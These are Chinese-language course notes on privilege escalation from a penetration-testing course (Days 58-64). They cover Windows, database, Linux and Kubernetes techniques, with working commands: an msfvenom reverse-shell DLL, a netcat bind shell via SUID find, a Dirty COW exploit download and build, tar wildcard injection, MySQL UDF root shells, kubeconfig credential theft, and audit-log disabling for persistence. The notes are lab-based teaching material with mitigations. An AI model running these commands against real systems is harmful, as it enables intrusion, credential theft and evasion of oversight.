---
title: XD安全渗透测试课程提权阶段学习笔记 Day58-64
description: 系统梳理XD安全渗透测试课程提权阶段（Day58-64）核心技术：Windows/Linux提权、数据库提权（MySQL/MSSQL/Oracle/Redis/PostgreSQL）、令牌窃取、烂土豆、DLL劫持、定时任务、内核漏洞（脏牛）、SUID、环境变量劫持、服务权限配置不当等实战技术体系，补充
  Dirty COW (CVE-2016-5195) 在 Kubernetes 容器环境中的实战利用细节与编译执行流程
category: program-analysis
tags:
- XD安全
- 渗透测试
- 提权
- Windows提权
- Linux提权
- 数据库提权
- 令牌窃取
- 烂土豆
- DLL劫持
- 定时任务
- 内核漏洞
- 脏牛
- CVE-2016-5195
- Dirty COW
- Kubernetes
- 容器逃逸
- SUID
- 服务权限
- 学习笔记
date: '2024-01-15'
updated: '2026-11-15'
---
# XD安全渗透测试课程提权阶段学习笔记 Day58-64

> 原文来源：XD安全渗透测试课程微信归档文章，作者耳鼠整理

本页面系统整理 XD安全渗透测试课程第 58-64 天提权阶段学习内容，涵盖 Web 权限提升、Windows 本地提权、数据库提权、Linux 提权等核心技术模块，形成结构化知识清单并交叉引用现有技术详解页面。新增 Kubernetes 集群渗透场景下 Dirty COW (CVE-2016-5195) 提权的完整实战链路与编译执行细节。

---

## 权限提升整体框架

### 权限层级与获取途径

| 权限类型 | 获取方式 | 可操作范围 |
|---------|---------|-----------|
| 后台权限 | 爆破、注入猜解、弱口令 | 操作应用界面内容、数据图片；若存在文件操作功能可操作文件数据 |
| 网站权限 | 上述三种思路 | 查看/修改程序源代码、读取配置文件（接口配置、数据库配置）、收集服务器 OS 信息 |
| 数据库权限 | 配置文件泄露、Webshell 读取配置 | 数据库增删改查 |
| 接口权限 | 后台修改配置、网站权限读取配置 | 邮件、短信、支付等第三方接口调用 |
| 系统权限 | 溢出漏洞、提权漏洞利用 | 服务器完全控制 |
| 域控权限 | 域渗透横向移动 | 整个域环境控制 |
| 容器/集群权限 | 容器逃逸、凭据窃取、K8s API 滥用 | 宿主机控制、集群资源枚举、横向移动至其他 Pod/Node |

> 关联页面：[[xd-security-pentest-course-curriculum]] 课程大纲导航 | [[xd-security-internal-network-penetration-notes-day65-66]] 域环境信息收集与横向移动 | [[kubernetes-penetration-testing]] Kubernetes 集群渗透测试全流程

---

## Day58：网站权限后台漏洞第三方获取

### 核心知识点
- 权限提升在渗透流程中的定位：前期-中期-后期知识关联
- 权限划分理解：当前权限对应可操作事项
- 利用成功后的思路总结：相关操作被拒绝时涉及提权

### 实战案例

#### 某挂机程序后台权限提升
- **后台地址发现** → 抓包分析 → 发现任意文件上传（无过滤）
- 关键功能点挖掘：SQL执行、文件操作（读取/写入）

#### 某BC广告导航页权限提升
- 中间件识别：phpStudy
- 利用 phpStudy 历史漏洞（Postman 构造恶意请求）

#### 苏丹大西瓜 GlassFish 中间件
- Fofa 资产收集 → 针对性漏洞利用

> 关联页面：[[xd-security-vulnerability-discovery-notes-day42-45]] 漏洞发现工具链 | [[xd-security-waf-bypass-techniques-day46-49]] WAF绕过策略

---

## Day59：Windows 溢出漏洞及 AT/SC/PS 提权

### 基础知识储备
- 用户及用户组权限划分
- Windows 提权核心命令
- 系统版本对应漏洞适配性

### 提权工具对比

| 工具 | 运行环境 | 适用场景 | 特点 |
|------|---------|---------|------|
| Vulmap | PowerShell | 本地提权 | 对 Web 提权不友好 |
| Wesng | - | Web 提权 | 主要用于 Web 环境 |
| WindowsVulnScan | PowerShell | 本地/Web | 可导入 systeminfo 信息离线扫描 |

> 关联页面：[[metasploit-framework-basics-tutorial]] Metasploit 基础使用 | [[peda-buffer-overflow-analysis-guide]] 缓冲区溢出分析指南

### 实战案例

#### 基于 Web 环境提权（阿里云靶机）
1. 已获 Web 权限 → 信息收集补丁情况
2. 补丁筛选 → MSF 或特定 EXP 利用
3. MSF 生成木马 → Webshell 上传执行 → 反弹 Shell
4. 阿里云安全组开放端口或隧道技术绕过

#### 基于本地环境提权 - 系统溢出漏洞
- CVE-2020-0787 Windows 本地提权

#### AT/SC/PS 命令提权（Windows 2003/2008/7）

**at 计划任务**
```cmd
at 15:13 /interactive cmd.exe
```
- 适用 Win7 之前系统，到时自动执行 SYSTEM 权限 cmd

**sc 服务创建**
```cmd
sc create syscmd binpath= "cmd /k start" type= own type= interact
sc start syscmd
```
- 据称可针对 Win7/Win8

**PsExec (PSTools)**
```cmd
psexec.exe -accepteula -s -i -d notepad.exe
```
- 针对 Windows 2008，需下载 PSTools
- 以 SYSTEM 权限启动进程

### 思路总结
1. 提权方法有环境适用性差异，也有通用方法
2. 操作系统版本决定利用面
3. 部分需特定环境（数据库、第三方软件）

---

## Day60：MySQL/MSSQL/Oracle 数据库提权

### 核心前提
- 获得数据库账号密码（Web/本地均可尝试）
- 服务器开启数据库服务
- 拥有最高权限用户密码
- 除 Access 外，其他数据库均有提权可能

### 提权通用流程
1. **探针**：端口、服务、其他方式判断数据库服务
2. **收集**：配置文件、存储文件、暴力破解获取最高权限密码
3. **分类利用**：按数据库类型选择对应技术

### MySQL 提权演示

#### UDF 提权
- **前提**：读取网站数据库配置文件（命名规则：sql/data/inc/config/conn/database/common/include 等）
- **密码获取**：MySQL 密码存储于 mysql 库 user.MYD 文件
  - 路径：`@@basedir/data/数据库名/表名.myd`
- **外联判断**：脚本暴力猜解（本地连接本地 vs 远程工具爆破）
- **版本差异**：
  - MySQL < 5.1：导出至 `C:/Windows` 或 `system32`
  - MySQL >= 5.1：导出至安装目录 `/lib/plugin/`（需手工创建或 NTFS 流创建）
- **实操**：`select 'x' into dumpfile '目录/lib/plugin::INDEX_ALLOCATION';` 创建目录 → 导出 DLL → `create function` 注册 → 命令执行

#### MOF 提权
- 导出自定义 MOF 文件到系统目录加载
- 参考：cnblogs.com/xishaonian/p/6384535.html

#### 启动项提权
- 导出可执行文件到启动目录，配合重启执行
- 实验环境：Win2012 + MSF `exploit/mysql/mysql_start_up`

#### 反弹 Shell 提权
- 利用 `select ... into outfile` 写入反弹命令

> 关联页面：[[mysql-dnslog-injection-loadfile-unc]] MySQL load_file DNSLog 外带 | [[xd-security-file-inclusion-notes]] 文件包含配置文件读取

### MSSQL 提权演示

#### xp_cmdshell
```sql
-- 启用
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
-- 执行
EXEC master.dbo.xp_cmdshell '命令';
```
- MSSQL 2000 默认开启，2005+ 默认关闭
- 若被删除可上传 `xplog70.dll` 恢复

#### sp_oacreate/sp_oamethod
```sql
DECLARE @shell INT;
EXEC sp_oacreate 'wscript.shell', @shell OUTPUT;
EXEC sp_oamethod @shell, 'run', NULL, 'cmd.exe /c whoami > c:\\1.txt';
```
- 调用 OLE 对象执行系统命令

#### 沙盒模式 / 映像劫持
- 相关注册表配置利用

> 关联页面: [[xd-security-code-audit-notes-day50-57]] 代码审计中数据库配置泄露挖掘

### Oracle 提权演示 (Oracleshell 工具)

| 模式 | 前提 | 效果 |
|------|------|------|
| 普通用户 | 普通连接账号 | 提权至 DBA，以 Oracle 实例权限执行命令 |
| DBA用户 | 拥有 DBA 账号 | 一键执行测试，省去创建存储过程步骤 |
| 注入模式 | 存在 Oracle 注入点 | 通过注入点直接执行系统命令（无回显，需自行验证） |

---

## Day61：Redis/PostgreSQL & 令牌窃取 & 进程注入

### Redis 提权
**前提**：配置不当（未授权访问/弱口令）、以 root 运行

| 方法 | 说明 |
|------|------|
| 计划任务反弹 Shell | `config set dir /var/spool/cron/` → `config set dbfilename root` → 写入反弹命令 |
| SSH 公钥写入 | `config set dir /root/.ssh/` → `config set dbfilename authorized_keys` → 写入公钥 |
| 低权限写 Webshell | `config set dir /var/www/html/` → `config set dbfilename shell.php` → 写入 Webshell |

**修复**：绑定 IP、设置密码、低权限运行、禁用登录

### PostgreSQL 提权
- **CVE-2019-9193** / **CVE-2018-1058**
- 9.3-11 版本，管理员或拥有 `COPY TO/FROM PROGRAM` 权限的用户可执行任意命令
- 修复：升级版本或打补丁

### Windows 令牌窃取提权 (Win2008/7)

**原理**：进程由用户执行，可窃取该用户令牌；远程过程调用时请求提升权限生成特权令牌

**实战流程 (MSF)**：
1. `getsystem` 尝试提权失败
2. `load incognito` 加载模块
3. `list_tokens -u` 列举可用令牌
4. `impersonate_token "NT AUTHORITY\\SYSTEM"` 窃取 SYSTEM 令牌
5. 成功后生成木马反弹 Shell

### Windows 进程注入提权 (Win2003/10)
- 利用注入进程所有者实现权限共享
- 主要适用 Win2008 之前系统
- 工具：`pexec64` (针对 32/64 位进程注入)
- 监听端口等待连接反弹 cmd

> 关联页面：[[cobalt-strike-external-c2-smb-beacon]] 进程注入与 SMB Beacon 通信 | [[phantom-dll-hollowing-technique]] Phantom DLL Hollowing 技术

---

## Day62：烂土豆 & DLL 劫持 & 引号路径 & 服务权限

### 必备知识点关联

| 技术 | 适用权限 | 核心原理 |
|------|---------|---------|
| 令牌窃取+烂土豆 | Web/数据库权限 | 非服务类用户无法直接窃取，烂土豆伪造 SYSTEM 令牌 |
| 不带引号服务路径 | Web/本地 | 空格路径解析漏洞，植入同名可执行文件 |
| 不安全服务权限 | 本地 (Web几率小) | 普通用户对服务有写权限，可修改二进制路径 |
| DLL 劫持 | 需第三方软件控制权 | 应用启动搜索 DLL 顺序劫持 |
| AlwaysInstallElevated | 极少 | 默认禁用，利用机会少 |

### 实战案例

#### Win2012 烂土豆 + 令牌窃取 (Web 权限)
```cmd
# Webshell 上传 potato.exe 到 C:\Users\Public
# MSF 控制台操作
use incognito
list_tokens -u
execute -cH -f ./potato.exe
list_tokens -u
impersonate_token "NT AUTHORITY\\SYSTEM"
```
- 烂土豆执行后生成 SYSTEM 令牌，再窃取成功

#### Win2012 DLL 劫持 + MSF (Web 权限)
1. **信息收集**：发现 FlashFXP 等第三方软件
2. **进程调试**：火绒剑分析启动加载的非系统 DLL
3. **生成恶意 DLL**：
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp lhost=IP lport=PORT -f dll > xiaodi.dll
   ```
4. **替换 DLL** → MSF 监听 → 管理员运行软件触发 → 反弹会话 → 令牌窃取提权至 SYSTEM

**条件**：有第三方软件、能替换 DLL、管理员会运行该程序

#### Win2012 不安全服务权限 (本地权限)
- `accesschk.exe /accepteula -uwcqv "Authenticated Users" *` 查找可写服务
- `sc qc 服务名` 查看当前配置
- `sc config 服务名 binpath= "cmd.exe /c ..."` 修改二进制路径
- 重启服务或 `sc start` 获取 SYSTEM 会话

#### Win2012 不带引号服务路径 (Web/本地)
```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```
- 发现路径含空格且无引号的服务
- 在空格前目录放置同名可执行文件 (如 `C:\Program.exe`)
- 服务启动时执行植入文件

### Windows 提权知识体系总结
- **权限层**：用户组划分、令牌机制
- **系统层**：版本对应漏洞、补丁筛选
- **防护层**：AV/EDR 绕过、免杀技术、文件落地 vs 无文件

> 关联页面：[[xd-security-python-security-development-notes]] PHP异或免杀Webshell生成 | [[xd-security-awd-competition-strategies]] AWD赛制加固与利用并行

---

## Day63：Linux 脏牛内核漏洞 & SUID & 信息收集

### 自动化信息收集脚本

| 脚本 | 语言 | 特点 |
|------|------|------|
| LinEnum | Shell | 经典枚举，上传至 `/tmp` 赋权执行 |
| Linuxprivchecker | Python | 需目标有 Python 环境 |
| linux-exploit-suggester | Shell | 内核漏洞匹配 |
| linux-exploit-suggester-2 | Perl | 另一种内核漏洞匹配工具 |

**用途**：信息收集为后续提权做准备；漏洞探针判定可能存在的漏洞

### Linux SUID 提权演示 (阿里云 Web 权限)

**漏洞成因**：`chmod u+s` 赋予 SUID 位，用户执行程序时以 root 权限运行

**检测命令**：
```bash
find / -user root -perm -4000 -print 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \;
```

**实战利用 (find 命令 SUID)**：
```bash
touch xiaodi
find xiaodi -exec whoami \;
find xiaodi -exec netcat -lvp 5555 -e /bin/sh \;
# 攻击机连接反弹 Shell
```

**流程**：冰蝎连接 Webshell → MSF 监听配合冰蝎反弹 Meterpreter → 上传枚举脚本 → 发现 `find` 有 SUID → 利用获取 root

### Linux 内核漏洞提权演示 (墨者靶机 Ubuntu 16.04)

**CVE-2017-16995**
1. 连接目标 → 上传检测脚本获取可利用漏洞
2. 选择 CVE-2017-16995 → 下载 EXP 源码
3. 上传目标 → `gcc 45010.c -o 45010` 编译
4. `chmod +x 45010 && ./45010` 执行提权

### Linux 脏牛漏洞演示 (VulnHub 靶机)

**完整攻击链**：
1. `nmap` 发现存活主机 → 端口扫描
2. 识别 CMS (Drupal) → MSF 搜索对应模块
3. 利用 Drupal 漏洞获取 Webshell
4. 运行 `linux-exploit-suggester` 发现 **CVE-2016-5195 (Dirty COW)**
5. 下载 EXP → 上传 → 编译 → 执行 → 获取 root

> 关联页面：[[vulnhub-doubletrouble-writeup]] Shellshock + Dirty COW 完整复现 | [[vulnhub-sar-writeup]] Cron + CVE-2021-3493 提权 | [[xd-security-incident-response-notes]] 应急响应日志分析溯源

### 🔬 补充：Dirty COW (CVE-2016-5195) 在 Kubernetes 容器环境中的实战利用细节

> 来源：0x00实验室微信归档《靶场测试之k8s集群》实战记录

#### 场景背景
- 目标：Kubernetes 集群节点（宿主机）
- 入口：Web 应用弱口令 (admin/password) → 任意文件上传 → 冰蝎 Webshell
- 限制：容器内大部分命令受限，需提权至宿主机 root

#### 漏洞原理速览
**Dirty COW (CVE-2016-5195)** 是 Linux 内核 2.6.22 至 4.8.3 间存在的竞争条件漏洞，位于内存子系统的写时复制 (Copy-on-Write, COW) 机制中。非特权用户可利用该漏洞将只读内存映射（如 `/etc/passwd`、二进制文件 `.text` 段）变为可写，实现本地提权。

- **影响内核版本**：>= 2.6.22 (2007 年发布) ~ 4.8.3 / 3.16.38 / 3.18.44 / 3.2.63 / 3.10.28 等长期维护分支修复版本之前
- **核心利用思路**：多线程并发触发 `madvise(MADV_DONTNEED)` 与 `write()`/`ptrace()` 竞争，绕过 COW 保护写入只读文件

#### 实战编译与执行流程

**1. 环境确认**
```bash
uname -r        # 确认内核版本在受影响范围
cat /etc/os-release
which gcc       # 确认目标有编译器；若无需本地交叉编译上传二进制
```

**2. 获取 Exploit 源码**
- 常用公开 EXP：`dirtyc0w.c` (github.com/dirtycow/dirtycow.github.io)、`cowroot.c`、`dcow.cpp` 等
- 示例下载：
  ```bash
  wget https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/dirtyc0w.c -O dirtyc0w.c
  # 或从 Exploit-DB: searchsploit "Dirty COW" → EDB-ID 40616/40839/40847
  ```

**3. 编译选项对比**

| 编译命令 | 适用场景 | 说明 |
|---------|---------|------|
| `gcc -pthread dirtyc0w.c -o dirtyc0w` | 标准利用 (修改 `/etc/passwd` 添加 root 用户) | 需链接 pthread 库实现多线程竞争 |
| `gcc -pthread -static dirtyc0w.c -o dirtyc0w` | 目标环境 glibc 版本不兼容/缺库 | 静态链接增大体积但提高兼容性 |
| `gcc -pthread cowroot.c -o cowroot` | 直接生成 root shell 的变体 | 部分 EXP 自带 payload 生成 SUID root shell |

> **注意**：容器环境若无 `gcc`，需在攻击机同架构/同 libc 环境下交叉编译（如 `musl-gcc` 静态编译），再上传二进制文件。

**4. 执行与提权验证**
```bash
chmod +x dirtyc0w
./dirtyc0w          # 运行 EXP，竞争窗口通常需几秒至数十秒
# 成功后按提示 su 新用户或直接获得 root shell
id                  # 验证 uid=0(root)
```

**5. 典型 EXP 行为差异**
- `dirtyc0w.c` (标准版)：修改 `/etc/passwd` 插入 `firefart:...:0:0:...:/root:/bin/bash`，需 `su firefart` 切换
- `cowroot.c`：直接在内存中劫持 `passwd` 结构或覆盖 SUID 二进制 (如 `/usr/bin/passwd`、`/bin/su`)，执行后直接弹 root shell
- `dcow.cpp` (C++ 版)：支持指定目标文件路径，可覆盖 `/etc/shadow`、`/etc/sudoers` 或任意 SUID 二进制

#### Kubernetes 场景下的后续利用链

**提权成功后（已在宿主机获得 root）：**

```bash
# 1. 窃取 Kubernetes 管理员凭据 (默认路径)
cat /etc/kubernetes/admin.conf
# 或
cat /root/.kube/config
```

**2. 本地保存配置并探索集群**
```bash
# 攻击机保存为 kubeconfig
export KUBECONFIG=/path/to/admin.conf

# 查看节点角色
kubectl get nodes -o wide
# 输出示例：单节点集群，该节点为 master (control-plane)
```

**3. 集群资源枚举**
```bash
# 查看所有命名空间的 Pod
kubectl get pods --all-namespaces -o wide

# 查看敏感资源：Secrets、ServiceAccounts、RoleBindings
kubectl get secrets --all-namespaces
kubectl get sa --all-namespaces
```

**4. 容器逃逸 / 横向移动限制**
- **Master 节点默认污点**：`node-role.kubernetes.io/control-plane:NoSchedule`，导致默认不调度业务 Pod 至 Master
- **利用思路**：
  - 若存在其他 Worker Node，可通过 `kubectl exec` 进入业务容器进一步渗透
  - 检查是否存在特权容器、HostPath 挂载、HostNetwork/HostPID/HostIPC 等危险配置
  - 利用 `kubectl auth can-i` 验证当前凭据权限边界

**5. 持久化与防御规避**
- 创建隐藏 ServiceAccount 并绑定 ClusterRole `cluster-admin`
- 修改 kube-apiserver 审计策略或关闭审计日志
- 在宿主机植入 systemd 服务 / cron 定时任务 / SSH 授权密钥

#### 修复与缓解建议

| 层面 | 措施 |
|------|------|
| 内核层面 | 升级内核至修复版本 (>= 4.8.3, 3.16.38, 3.18.44, 3.2.63, 3.10.28 等) |
| 容器层面 | 启用 `seccomp` 禁用 `madvise`/`ptrace` 等高危系统调用；使用 `gVisor`/`Kata Containers` 隔离内核 |
| 集群层面 | 避免在 Master 运行业务 Pod；最小化 RBAC 权限；定期轮换 `admin.conf` 证书；开启审计日志并告警异常 `exec`/`port-forward` |
| 主机层面 | 部署 Falco / Tracee 等运行时安全监测内核漏洞利用行为 (检测 `madvise` + `write` 竞争模式) |

> 关联页面：[[kubernetes-penetration-testing]] Kubernetes 集群渗透测试全流程 | [[vulnhub-doubletrouble-writeup]] Shellshock + Dirty COW 完整复现 | [[linux-kernel-hardening-mechanisms]] Linux 内核硬化机制

---

## Day64：Linux 定时任务 & 环境变量 & 数据库提权

### 环境变量劫持提权 (本地用户 + SUID)

**原理**：`PATH` 环境变量优先级，伪造系统命令

**条件**：
1. 目标二进制有 SUID 权限
2. 需本地用户交互环境 (Webshell 无法直接 `export PATH` 生效)

**演示**：
```c
// demo.c
int main() { setuid(0); system("/bin/sh"); }
```
```bash
gcc demo.c -o shell
cp /bin/sh /tmp/ps
export PATH=/tmp:$PATH
./shell  # 执行 /tmp/ps (实际是 /bin/sh) 获取 root
```

### 定时任务提权 (三种场景)

#### 相对路径问题 (实验未成功)
- `/etc/crontab` 中脚本使用相对路径
- 计划任务默认在特定目录执行
- 攻击者在用户目录创建同名恶意脚本

#### 通配符命令注入 (本地提权经典)
**不安全备份命令**：`cd /home/undead/script; tar czf /tmp/backup.tar.gz *`

**利用**：
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/undead/script/test.sh
echo "" > "--checkpoint-action=exec=sh test.sh"
echo "" > "--checkpoint=1"
```
- `tar` 通配符 `*` 会将文件名作为参数传递
- `--checkpoint-action=exec` 执行指定脚本
- 生成 `/tmp/bash` 带 SUID → 执行获取 root

**扩展**：其他支持参数执行的命令同理可利用

#### 权限配置不当
- 定时任务脚本权限 `777/775` 允许普通用户修改
- 直接覆盖脚本内容植入提权命令
- 判断：`ls -al 定时任务目录`

### Linux MySQL UDF 提权 (VulnHub 靶机)

**完整流程**：
1. `nmap` 发现目标 → 目录遍历发现 `PHPMailerAutoload.php`
2. 利用 PHPMailer 漏洞 (CVE-2016-10033/10045) 反弹 Shell
3. 冰蝎连接 → 上传枚举脚本 → 发现 MySQL root 密码 (配置文件)
4. `searchsploit` 搜索 MySQL UDF 提权 (EDB-ID 1518 `raptor_udf.c`)
5. 本地编译 `.so` 动态库 (目标可能无 gcc)：
   ```bash
   gcc -g -c raptor_udf.c
   gcc -g -shared -o raptor_udf.so raptor_udf.o
   ```
6. 上传 `.so` → MySQL 导出 UDF：
   ```sql
   USE mysql;
   CREATE TABLE foo(line BLOB);
   INSERT INTO foo VALUES(LOAD_FILE('/tmp/1518.so'));
   SELECT * FROM foo INTO DUMPFILE '/usr/lib/mysql/plugin/1518.so';
   CREATE FUNCTION do_system RETURNS INTEGER SONAME '1518.so';
   SELECT do_system('cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash');
   ```
7. 执行 `/tmp/rootbash -p` 获取 root

> 关联页面：[[xd-security-src-vulnerability-hunting-notes-day86-88]] FOFA 语法与 JS 指纹识别 | [[proftpd-133c-backdoor-exploitation]] ProFTPd 后门利用链

---

## Linux 提权漏洞查找扩展总结

1. **提权环境与信息收集**：SUID、定时任务、潜在漏洞、第三方服务应用
2. **最新漏洞关注点**：二次开发枚举脚本、自动化检测能力建设
3. **搜索渠道**：本地 `searchsploit`、远程 Exploit-DB 站点
4. **其他提权手法**：
   - 密码复用 (MySQL/第三方应用密码可能同 root)
   - GUID/SGID 程序利用
   - `sudo` 配置错误 (`sudo -l` 检查)
   - 內核漏洞 (脏牛、CVE-2017-16995 等)
   - 容器逃逸 (Docker 环境、Kubernetes 特权容器/HostPath/凭据窃取)

> 关联页面：[[xd-security-internal-network-penetration-notes-day67-68]] 域横向移动凭证复用 | [[xd-security-internal-network-penetration-notes-day69-70]] Cobalt Strike 内网漫游 | [[frp内网渗透应用]] frp 多级隧道实战 | [[kubernetes-penetration-testing]] Kubernetes 集群渗透测试全流程

---

## 交叉引用导航

| 阶段 | 关联页面 | 核心内容 |
|------|---------|---------|
| 课程总览 | [[xd-security-pentest-course-curriculum]] | 88天课程大纲、网盘资源 |
| 基础阶段 | [[xd-security-pentest-basic-stage-notes]] | Web基础、SQL注入、文件上传 |
| 代码审计 | [[xd-security-code-audit-notes-day50-57]] | PHP/Java审计、CMS实战、框架漏洞 |
| 漏洞发现 | [[xd-security-vulnerability-discovery-notes-day42-45]] | 扫描器实战、移动/API安全 |
| WAF绕过 | [[xd-security-waf-bypass-techniques-day46-49]] | 三大WAF绕过、Payload变异 |
| 逻辑漏洞 | [[xd-security-logic-vulnerability-notes-day33-36]] | 越权、支付篡改、验证绕过 |
| XSS | [[xd-security-xss-vulnerability-notes-day25-28]] | 分类、BeEF、WAF绕过、XSStrike |
| CSRF/SSRF/RCE | [[xd-security-csrf-ssrf-rce-notes-day29-30]] | Pikachu实战、Webmin/Struts2/HFS |
| 反序列化/XXE | [[xd-security-deserialization-xxe-notes-day37-39]] | PHP/Java反序列化、Blind XXE、UTF-16BE |
| 文件包含 | [[xd-security-file-inclusion-notes]] | LFI/RFI、伪协议、敏感路径 |
| 内网渗透 Day65-66 | [[xd-security-internal-network-penetration-notes-day65-66]] | 域环境判断、四维信息收集、at/schtasks/impacket |
| 内网渗透 Day67-68 | [[xd-security-internal-network-penetration-notes-day67-68]] | SMB/WMI/Pass-the-Hash/Key/Ticket、黄金票据 |
| 内网渗透 Day69-70 | [[xd-security-internal-network-penetration-notes-day69-70]] | Cobalt Strike、Kerberoasting、SOCKS代理、frp/ngrok |
| 隧道/会话移交 | [[xd-security-internal-network-penetration-notes-day71-72]] | ICMP/DNS隧道、CS↔MSF会话移交、Webshell溯源 |
| 应急响应 | [[xd-security-incident-response-notes]] | 日志分析、勒索病毒、自动化工具箱 |
| Python安全开发 | [[xd-security-python-security-development-notes]] | 信息收集自动化、SqlmapAPI、Pocsuite3、免杀 |
| SRC漏洞挖掘 | [[xd-security-src-vulnerability-hunting-notes-day86-88]] | 教育SRC、CNVD、.NET单点登录、MSSQL写Shell |
| CTF实战 | [[xd-security-ctf-flag-notes-day83-85]] | 序列化、SSTI、PHP弱类型、Java WEB-INF/XXE |
| AWD攻防 | [[xd-security-awd-competition-strategies]] | 赛制规则、不死马、inotify、微型WAF、蜜罐 |
| 蓝队防御 | [[xd-security-blue-team-defense]] | ATT&CK映射、HFish蜜罐、NIDS/HIDS、检测规则 |
| Kubernetes 渗透 | [[kubernetes-penetration-testing]] | 文件上传、Dirty COW 提权、凭据窃取、kubectl 集群探索、Master 节点负载限制 |
| VulnHub 实战 | [[vulnhub-doubletrouble-writeup]] | Shellshock + Dirty COW 完整攻击链复现 |
| 内核硬化 | [[linux-kernel-hardening-mechanisms]] | Linux 内核编译期/运行期缓解措施、Grsecurity/PaX 特性 |

---

## 结语

本页面梳理了 XD安全渗透测试课程 Day58-64 提权阶段的核心技术体系，覆盖 **Windows 本地/Web 提权**、**数据库提权 (MySQL/MSSQL/Oracle/Redis/PostgreSQL)**、**Linux 提权 (SUID/内核漏洞/定时任务/环境变量/UDF)** 等实战场景。重点补充了 **Dirty COW (CVE-2016-5195) 在 Kubernetes 容器环境中的完整利用链路**：从 Web 弱口令 Getshell、容器内受限环境、内核漏洞编译执行（含静态链接兼容性处理）、宿主机 Root 提权、Kubernetes 管理员凭据窃取、`kubectl` 集群资源枚举，至 Master 节点工作负载限制的横向移动边界分析。每个技术点均给出原理、前提条件、利用流程、工具命令及修复建议，并通过交叉引用连接知识库现有技术详解页面，形成可检索、可复用的结构化知识资产。

> 技术交流，勿做违法用途。

## 来源

- [0x00实验室-202108-202304_110](../sources/0x00实验室-202108-202304_110.md)
- [0x6270安全团队-202203-202304_21](../sources/0x6270安全团队-202203-202304_21.md)
